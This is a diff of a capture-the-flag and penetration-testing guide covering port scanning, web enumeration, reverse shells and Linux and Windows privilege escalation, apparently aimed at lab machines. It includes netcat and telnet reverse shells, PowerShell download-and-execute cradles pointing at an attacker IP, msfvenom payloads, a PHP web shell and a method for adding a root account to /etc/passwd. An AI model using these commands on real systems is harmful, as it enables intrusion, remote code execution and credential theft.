@@ -109,13 +109,14 @@ Unicornscan
 
 A port scanner that utilizes its own userland TCP/IP stack, which allows it to run asynchronous scans. It can scan 65,535 ports in a relatively short time frame.
 
-As unicornscan is faster then nmap it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. Superkojiman has written a script for this available at `GitHub <https://github.com/superkojiman/onetwopunch>`_.
+As unicornscan is faster then nmap it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. Superkojiman has written `onetwopunch <https://github.com/superkojiman/onetwopunch>`_ for this.
 
 ::  
 
    unicornscan [options] X.X.X.X/YY:S-E 
      -i, --interface : interface name, like eth0 or fxp1, not normally required 
      -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf' for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)
+
      Address ranges are in cidr notation like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask /32 is implied. 
      Port ranges are like 1-4096 with 53 only scanning one port, **a** for all 65k and p for 1-1024
 
@@ -134,6 +135,7 @@ For a TCP scan, the format is:
 ::
 
   nc -vvn -z xxx.xxx.xxx.xxx startport-endport
+
      -z flag is Zero-I/O mode (used for scanning)
      -vv will provide verbose information about the results
      -n flag allows to skip the DNS lookup
@@ -156,7 +158,7 @@ Amap - Application mapper
 
 When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you which application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine which application is running.
 
-By using **amap**, we can identify which services are running on a given port. For example is there a SSL server running on port 3445 or some oracle listener on port 23? Note that the application can also handle services that requires SSL. Therefore it will perform an SSL connect followed by trying to identify the SSL-enabled protocol!  One of the vulnhub VM's for example was running http and https on the same port.
+By using **amap**, we can identify which services are running on a given port. For example is there a SSL server running on port 3445 or some oracle listener on port 23? Note that the application can also handle services that requires SSL. Therefore it will perform an SSL connect followed by trying to identify the SSL-enabled protocol!. e.g.  One of the vulnhub VM's was running http and https on the same port.
 
 ::
 
@@ -171,8 +173,8 @@ By using **amap**, we can identify which services are running on a given port. F
 
 .. _rabbit-holes:
 
-Rabbit Holes?
-=============
+Rabbit Holes
+============
 
 There will be instances when we will not able to find anything entry point such as any open port. The section below may provide some clues on how to get unstuck.
 
@@ -232,7 +234,7 @@ Example:
 SSL Certificate
 ---------------
 
-If the targeted machine is running an https server and we are getting an apache default webpage on hitting the https://IPAddress, vhosts are probably in use. Check the alt-dns-name on the ssl-certificate, create an entry in hosts file (/etc/hosts) and check what is being hosted on these domain names by surfing to https://alt-dns-name.
+If the targeted machine is running an https server and we are getting an apache default webpage on hitting the https://IPAddress, virtual hosts would be probably in use. Check the alt-dns-name on the ssl-certificate, create an entry in hosts file (/etc/hosts) and check what is being hosted on these domain names by surfing to https://alt-dns-name.
 
 nmap service scan result for port 443 (sample)
 
@@ -247,7 +249,7 @@ nmap service scan result for port 443 (sample)
 From Nothing to a Unprivileged Shell
 ====================================
 
-At this point, we would have an idea about the different services and service version running on the system. Besides the output given by nmap. It is also recommended to check what software is being used on the webservers (eg certain cms's)
+At this point, we would have an idea about the different services and service version running on the system. Besides the output given by nmap. It is also recommended to check what software is being used on the webservers (e.g. certain cms's)
 
 searchsploit
 ------------
@@ -301,7 +303,7 @@ Searchsploit provides an option to read the nmap XML file and suggest vulnerabil
 SecLists.Org Security Mailing List Archive
 ------------------------------------------
 
-There will be some days, when you won't find vulnerabilities with searchsploit. In this case, we should also check the `seclists.org security mailing list google search <http://seclists.org/>`_, if someone has reported any bug(s) for that particular software that we can exploit. 
+There will be some days, when you won't find vulnerabilities with searchsploit. In this case, we should also check the `SecLists.Org Security Mailing List Archive <http://seclists.org/>`_, if someone has reported any bug(s) for that particular software that we can exploit. 
 
 Google-Vulns
 ------------
@@ -340,7 +342,7 @@ dirb, wfuzz, dirbuster
 
 Furthermore, we can run the following programs to find any hidden directories.
 
-* `DIRB <https://tools.kali.org/web-applications/dirb>`_ is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analysing the response.
+* `DIRB <https://tools.kali.org/web-applications/dirb>`_ is a Web Content Scanner. It looks for existing (and/ or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analysing the response.
 * `wfuzz <https://tools.kali.org/web-applications/wfuzz>`_ - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let's say, when we dirb we get 50 directories. Each directory containing an image. Often, we then need to figure out which image is different. In this case, we would figure out what's the size of the normal image and hide that particular response with wfuzz.
 * `Dirbuster <https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project>`_ : DirBuster is a multi threaded java application designed to brute force directories and files names on web/ application servers. 
 
@@ -401,7 +403,7 @@ Curl can be used to check the available options (supported http verbs):
   <
   * Connection #0 to host 192.168.126.129 left intact
 
-The PUT method allows you to upload a file. Which can help us to get a shell on the machine. There are multiple methods available for uploading a file with the PUT method mentioned on `Detecting and exploiting the HTTP Put Method <http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html>`_ 
+The PUT method allows you to upload a file which can help us to get a shell on the machine. There are multiple methods available for uploading a file with the PUT method mentioned on `Detecting and exploiting the HTTP Put Method <http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html>`_ 
 
 A few are:
 
@@ -422,6 +424,9 @@ A few are:
  :: 
 
    curl -X PUT -d '
+   curl -i -X PUT -H "Content-Type: application/xml; charset=utf-8" -d @"/tmp/some-file.xml" http://IPAddress/newpage
+   curl -X PUT -d "text or data to put" http://IPAddress/destination_page
+   curl -i -H "Accept: application/json" -X PUT -d "text or data to put" http://IPAddress/new_page
 
 Wordpress
 ^^^^^^^^^
@@ -457,7 +462,7 @@ We can also use wpscan to bruteforce passwords for a given username
 
   wpscan --url http://192.168.1.2 --wordlist wordlist.txt --username example_username
 
-Tips
+**Tips**
 
 * If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible ways is to go to Appearance > Editor > Edit 404 Template.
 * The configuration of worpdress is normally speaking stored in **wp-config.php**. If you are able to download it, you might be lucky and be able to loot plaintext username and passwords to the database or wp-admin page. 
@@ -469,14 +474,12 @@ Tips
 
    http://IP/wp-content/plugins/custompluginname
 
-.. Todo:: what is the (standard) format of a wp hash and where in the database is it stored?
-
-**todo: elborate more on wp scanning and vulnerabilities?**
+.. Todo:: what is the (standard) format of a wp hash and where in the database is it stored? Elborate more on wp scanning and vulnerabilities?
 
 Names? Possible Usernames & Passwords?
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    
-Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written a script `namemash.py <https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py>`_ which could be used to create possible usernames. However, after completion we are left with a large amount of potential usernames with no passwords.
+Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written `namemash.py <https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py>`_ which could be used to create possible usernames. However, after completion we are left with a large amount of potential usernames with no passwords.
 
 If the vulnerable machine is running a SMTP mail server, we can verify if a particular username exists or not.
 
@@ -484,7 +487,7 @@ If the vulnerable machine is running a SMTP mail server, we can verify if a part
 * Using VRFY command:
 * Using RCPT TO command:
 
-Once we have identified a pattern, we may modify namemash.py to generate usernames and check if they exist or not.
+Once we have identified a pattern of username creation, we may modify namemash.py to generate usernames and check if they exist or not.
 
 Brute forcing: hydra
 ^^^^^^^^^^^^^^^^^^^^
@@ -538,13 +541,12 @@ Examples:
  "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
  "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
 
-.. Todo:: add a program/binary that an easier syntax, ncrack maybe? 
-.. Todo:: eloborate on the examples, eg. what they will do once executed?
+.. Todo:: Add a program/binary that an easier syntax, ncrack maybe? Elaborate on the examples, eg. what they will do once executed?
 
 Reverse Shells
 --------------
 
-Once we have figured out some vulnerability or misconfiguration in a running service. Which allows us to make a connection back to our attack machine we would like to set up a reverse shell. This can be done through version methods eg by using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. The section below has been mostly adapted from `PentestMonkey Reverse shell cheat sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_  and `Reverse Shell Cheat sheet from HighOn.Coffee <https://highon.coffee/blog/reverse-shell-cheat-sheet/>`_ and more.
+Once we have figured out some vulnerability or misconfiguration in a running service which allows us to make a connection back to our attack machine, we would like to set up a reverse shell. This can be done through version methods e.g. by using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. The section below has been mostly adapted from `PentestMonkey Reverse shell cheat sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_  and `Reverse Shell Cheat sheet from HighOn.Coffee <https://highon.coffee/blog/reverse-shell-cheat-sheet/>`_ and more.
 
 netcat (nc)
 ^^^^^^^^^^^
@@ -553,7 +555,7 @@ netcat (nc)
 
  ::
 
-   nc -e /bin/sh 10.0.0.1 1234
+   nc -e /bin/sh 10.1.1.1 4444
 
 * without -e option
 
@@ -568,7 +570,7 @@ PHP
 
 * **PHP Web Shell**
 
-This is a kind of Web shell and not a reverse shell.
+ This is a kind of Web shell and not a reverse shell.
 
  We can create a new file say (shell.php) on the server containing
 
@@ -604,7 +606,13 @@ This is a kind of Web shell and not a reverse shell.
   -data-urlencode <data> (HTTP) Posts data, similar to the other -d, --data options with the exception that this performs URL-encoding. 
   -b, --cookie <data> (HTTP) Passes the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a "Set-Cookie:" line.  The data should be in the format "NAME1=VALUE1; NAME2=VALUE2".
 
- .. Todo:: explain the sed command at the end of the command given above 
+ The sed command in the end
+
+ ::
+
+  sed '/<html>/,/<\/html>/d'
+
+ deletes the content between <html> and </html> tag.
 
  If you also want to provide upload functionality (imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file
 
@@ -619,16 +627,29 @@ This is a kind of Web shell and not a reverse shell.
    }
   ?>
 
-  
+ The above can be accessed by 
+
+ ::
+
+  http://IP/shell.php?fupload=filename_on_your_webserver
+
+
 * **PHP Meterpreter**
 
  We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.
 
- .. Todo:: explain how to set up a multi handler
-
  ::
 
   msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php
+
+ We can set the multi-handler in metasploit by 
+
+ ::
+  
+  use exploit/multi/handler
+  set payload php/meterpreter/reverse_tcp
+  set LHOST yourIP
+  run
 
 * **PHP Reverse Shell**
 
@@ -656,8 +677,8 @@ which can then be called by
   weevely http://192.168.1.2/location_of_payload password
 
 However, it was not as useful as php meterpreter or a reverse shell.
-.. Todo:: elobrate -> why wasn't it usefull?
-.. Todo:: iirc (really not sure) if you don't provide a password it will ask for it
+
+.. Todo:: Elobrate -> why wasn't it useful? iirc (really not sure) if you don't provide a password it will ask for it
 
 Ruby
 ^^^^
@@ -779,7 +800,7 @@ Telnet Reverse Shell
 
  telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 
- .. Todo:: explain the example above
+.. Todo:: explain the example above
 
 XTerm
 ^^^^^
@@ -850,8 +871,6 @@ If there's a way, we can execute code from windows, we may try
  ::
 
   Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://YourIPAddress:8000/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost YourIPAddress -Lport 4444 -Force"
-
-* Upload ncat and execute 
 
 .. Todo:: add Nishang?
 
@@ -1102,7 +1121,7 @@ With the shell still backgrounded, set the current STTY to type raw and tell it 
 
  stty raw -echo 
 
-With a raw stty, input/output will look weird and you won't see the next commands, but as you type they are being processed.
+With a raw stty, input/ output will look weird and you won't see the next commands, but as you type they are being processed.
 
 Next foreground the shell with fg. It will re-open the reverse shell but formatting will be off. Finally, reinitialize the terminal with reset.
 
@@ -1207,7 +1226,7 @@ Find out information about the environment.
 * Run 'export -p' to see the exported variables in the shell. This would tell which variables are read-only. Most likely the PATH ($PATH) and SHELL ($SHELL) variables are '-rx', which means we can execute them, but not write to them. If they are writeable, we would be able to escape the restricted shell! 
 
  * If the SHELL variable is writeable, you can simply set it to your shell of choice (i.e. sh, bash, ksh, etc...). 
- * If the PATH is writeable, then you'll be able to set it to any directory you want. I recommend setting it to one that has commands vulnerable to shell escapes.
+ * If the PATH is writeable, then you'll be able to set it to any directory you want. We recommend setting it to one that has commands vulnerable to shell escapes.
 
 * Try basic Unix commands and see what's allowed ls, pwd, cd, env, set, export, vi, cp, mv etc.
 
@@ -1281,6 +1300,7 @@ SSHing from outside
 
   ssh username@IP -t "bash --noprofile"
 
+  -t      Force pseudo-terminal allocation.  This can be used to execute arbitrary screen-based programs on a remote machine, which can be very useful, e.g. when implementing menu services.  Multiple -t options force tty allocation, even if ssh has no local tty
 
 Getting out of rvim
 ^^^^^^^^^^^^^^^^^^^
@@ -1410,7 +1430,7 @@ Unprivileged Shell to Privileged Shell
 
 Probably, at this point of time, we would have unprivileged shell of user www-data. If you are on Windows, there are particular set of steps. If you are on linux, it would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions. 
 
-If you have become a normal user of which you have a password, it would be a good idea to check sudo -l (for every user! Yes, even for www-data) to check if there are any executables you have permission to run.
+[Linux] If you have become a normal user of which you have a password, it would be a good idea to check sudo -l (for every user! Yes, even for www-data) to check if there are any executables you have permission to run.
 
 Windows Privilege Escalation
 ----------------------------
@@ -1494,7 +1514,7 @@ Metasploit local_exploit_suggester : The module suggests local meterpreter explo
 Sherlock and PowerUp Powershell Script
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-* `Sherlock <https://github.com/rasta-mouse/Sherlock>`_ PowerShell script by rastamouse to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local_exploit_suggester didn't resulted in any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.
+* `Sherlock <https://github.com/rasta-mouse/Sherlock>`_ PowerShell script by `rastamouse <https://twitter.com/_RastaMouse>`_ to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local_exploit_suggester didn't resulted in any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.
 
 * `PowerUp <https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc>`_ : PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.
 
@@ -1504,7 +1524,7 @@ The above can be executed by
 
  view-source:10.54.98.X/shell.php?cmd=echo IEX (New-Object Net.WebClient).DownloadString("http://YourIP:8000/Sherlock.ps1"); | powershell -noprofile -
 
- We execute powershell with noprofile and accept the input from stdin
+We execute powershell with noprofile and accept the input from stdin
 
 Windows Exploit Suggestor
 ^^^^^^^^^^^^^^^^^^^^^^^^^
@@ -1628,13 +1648,14 @@ A few 'common' places: /tmp, /var/tmp, /dev/shm
 
   find / -writable -type d 2>/dev/null      # world-writeable folders
   find / -perm -222 -type d 2>/dev/null     # world-writeable folders
-  find / -perm -o w -type d 2>/dev/null     # world-writeable folders
-  find / -perm -o w -type f 2>/dev/null     # world-writeable files
+  find / -perm -o+w -type d 2>/dev/null     # world-writeable folders
+  find / -perm -o+w -type f 2>/dev/null     # world-writeable files
+  find / -type f -perm -o+w -not -type l -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null # world-writeable files
 
-  find / -perm -o x -type d 2>/dev/null     # world-executable folders
-  find / -perm -o x -type f 2>/dev/null     # world-executable files
+  find / -perm -o+x -type d 2>/dev/null     # world-executable folders
+  find / -perm -o+x -type f 2>/dev/null     # world-executable files
 
-  find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+  find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
 
 
 Any "problem" files?
@@ -1665,7 +1686,8 @@ Other Linux Privilege Escalation
 
 Execution of binary from Relative location than Absolute
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-If we figure out that a suid binary is running with relative locations (for example let's say backjob is running "id" and "scp /tmp/special ron@ton.home")(figured out by running strings on the binary). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.
+If we figure out that a suid binary is running with relative locations (for example let's say backjob is running "id" and "scp /tmp/special ron@ton.home")(figured out by running strings on the binary). The problem with this is, that it’s trying to 
+execute a file/ script/ program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.
 
 Something like this:
 
@@ -1822,7 +1844,7 @@ This might be useful to bypass some filtering, when let's say a cronjob is runni
 Time of check to time of use
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-In Unix, if a binary program such as below following C code (uses access to check the access of the specific file and open to open a specific file), when used in a setuid program, has a TOCTTOU bug:
+In Unix, if a binary program such as below following C code (uses access to check the access of the specific file and to open a specific file), when used in a setuid program, has a TOCTTOU bug:
 
 ::
 
@@ -1876,12 +1898,26 @@ Writable /etc/passwd or account credentials came from a legacy unix system
 * Passwords are normally stored in /etc/shadow, which is not readable by users. However, historically, they were stored in the world-readable file /etc/passwd along with all account information. 
 * For backward compatibility, if a password hash is present in the second column in /etc/passwd, it takes precedence over the one in /etc/shadow. 
 * Also, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled. 
-* If passwordless accounts are disabled, you can put the hash of a password of your choice. You can use the crypt function to generate password hashes, for example
+* If passwordless accounts are disabled, you can put the hash of a password of your choice. we can use the mkpasswd to generate password hashes, for example
 
  ::
     
-   perl -le 'print crypt("foo", "aa")' to set the password to foo. 
+   Usage: mkpasswd [OPTIONS]... [PASSWORD [SALT]]
+   Crypts the PASSWORD using crypt(3).
 
+      -m, --method=TYPE     select method TYPE
+      -5                    like --method=md5
+      -S, --salt=SALT       use the specified SALT
+      -R, --rounds=NUMBER   use the specified NUMBER of rounds
+      -P, --password-fd=NUM read the password from file descriptor NUM
+                            instead of /dev/tty
+      -s, --stdin           like --password-fd=0
+      -h, --help            display this help and exit
+      -V, --version         output version information and exit
+    
+  mkpasswd can generate DES, MD5, SHA-256, SHA-512
+
+  
 * It's possible to gain root access even if you can only append to /etc/passwd and not overwrite the contents. That's because it's possible to have multiple entries for the same user, as long as they have different names — users are identified by their ID, not by their name, and the defining feature of the root account is not its name but the fact that it has user ID 0. So you can create an alternate root account by appending a line that declares an account with another name, a password of your choice and user ID 0
 
 Elevating privilege from a suid binary
@@ -1913,7 +1949,7 @@ More details can be found at `Common Pitfalls When Writing Exploits <http://www.
 MySQL Privileged Escalation
 ---------------------------
 
-If mysql (version 4.x, 5.x) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize `User-Defined Function (UDF) Dynamic Library Exploit <http://www.0xdeadbeef.info/exploits/raptor_udf.c>`_ . A blog named `Gaining a root shell using mysql user defined functions and setuid binaries <https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/>`_  
+If mysql (version 4.x, 5.x) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize `User-Defined Function (UDF) Dynamic Library Exploit <http://www.0xdeadbeef.info/exploits/raptor_udf.c>`_ . Refer `Gaining a root shell using mysql user defined functions and setuid binaries <https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/>`_  
 
 More Information
 ^^^^^^^^^^^^^^^^
@@ -1955,7 +1991,7 @@ There are also options
  Dpkg::Pre-Invoke {"command";};
  Dpkg::Post-Invoke {"command";};
 
-They execute commands before/after apt calls dpkg. Post-Invoke which is invoked after every execution of dpkg (by an apt tool, not manually);
+They execute commands before/ after apt calls dpkg. Post-Invoke which is invoked after every execution of dpkg (by an apt tool, not manually);
 
 APT
 ^^^
@@ -2016,7 +2052,7 @@ and then
 
   cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
 
-which will add contents of temp.sh to tidyup.sh. ( Assuming tidyup.sh is running as root by crontab )
+which will add contents of temp.sh to tidyup.sh. (Assuming tidyup.sh is running as root by crontab)
 
 tcpdump
 ^^^^^^^
@@ -2073,14 +2109,9 @@ If find is suid, we can use
  touch foo
  find foo -exec whoami \;
 
-Here, the foo file ( a blank file ) is created using the touch command as the -exec parameter of the find command will execute the given command for every file that it finds, so by using “find foo” it is ensured they only execute once. The above command will be executed as root.
+Here, the foo file (a blank file) is created using the touch command as the -exec parameter of the find command will execute the given command for every file that it finds, so by using “find foo” it is ensured they only execute once. The above command will be executed as root.
 
-HollyGrace has mentioned this in `Linux PrivEsc: Abusing SUID <https://www.gracefulsecurity.com/linux-privesc-abusing-suid/>`_
-
-
-
-
-More can be learn `How-I-got-root-with-sudo <https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/>`_.
+HollyGrace has mentioned this in `Linux PrivEsc: Abusing SUID <https://www.gracefulsecurity.com/linux-privesc-abusing-suid/>`_ More can be learn `How-I-got-root-with-sudo <https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/>`_.
 
 
 Unix Wildcards
@@ -3289,7 +3320,7 @@ If we find that home directory contains
 Firefox/ Thunderbird/ Seabird
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-We can utilize `Firefox Decrypt <https://github.com/unode/firefox_decrypt>`_ is a tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles. It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, a password will still be requested but can be left blank.
+We can utilize `Firefox Decrypt <https://github.com/unode/firefox_decrypt>`_ is a tool to extract passwords from Mozilla (Firefox/ Thunderbird/ Seabird) profiles. It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, a password will still be requested but can be left blank.
 
 Sudoers file
 ------------
@@ -3457,7 +3488,7 @@ Grep in input box?
         passthru("grep -i $key dictionary.txt");
     }
 
-    Here we can use ".* /etc/passwd #" 
+ Here we can use ".* /etc/passwd #" 
 
  This command searches for any character in the file and comments out the reference to dictionary.txt
 
